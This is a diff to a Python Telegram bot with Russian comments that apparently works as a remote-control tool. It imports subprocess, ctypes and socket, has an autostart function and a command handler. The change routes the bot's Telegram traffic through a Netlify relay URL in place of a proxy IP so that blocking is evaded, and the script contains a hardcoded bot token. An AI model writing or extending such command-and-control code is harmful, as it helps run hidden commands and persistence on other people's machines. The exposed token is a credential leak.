@@ -1,4 +1,5 @@
 import telebot
+from telebot import apihelper
 import os
 import subprocess
 import ctypes
@@ -10,15 +11,13 @@ import platform
 import socket
 import time
 
-# --- НАСТРОЙКА ПРОКСИ (Франция) ---
-PROXY_IP = "109.199.119.160"
-PROXY_PORT = "80"
-proxy_url = f"http://{PROXY_IP}:{PROXY_PORT}"
-telebot.apihelper.proxy = {'https': proxy_url}
-# ----------------------------------
+# --- НАСТРОЙКА МОСТА ЧЕРЕЗ NETLIFY ---
+# Теперь бот стучится не в заблокированный Telegram, а на твой сайт
+apihelper.API_URL = "https://discord-botar.netlify.app/bot{0}/{1}"
+# ---------------------------------------
 
 # --- НАСТРОЙКИ БОТА ---
-TOKEN = "9263108544:AAGo7K3U6DLLdbQkaTFywaIoCVfpTszM96Y" # ВСТАВЬ СЮДА ТОКЕН ОТ BOTFATHER
+TOKEN = "9263108544:AAGo7K3U6DLLdbQkaTFywaIoCVfpTszM96Y" # ВСТАВЬ СЮДА ТОКЕН ОТ BOTFATHER (без слова bot)
 bot = telebot.TeleBot(TOKEN)
 
 # --- ФУНКЦИЯ АВТОЗАГРУЗКИ ---
@@ -190,5 +189,5 @@ def cmd(message):
     except Exception as e:
         bot.reply_to(message, f"Ошибка: {e}")
 
-print("Бот запущен с прокси...")
+print("Бот запущен через мост Netlify...")
 bot.infinity_polling()
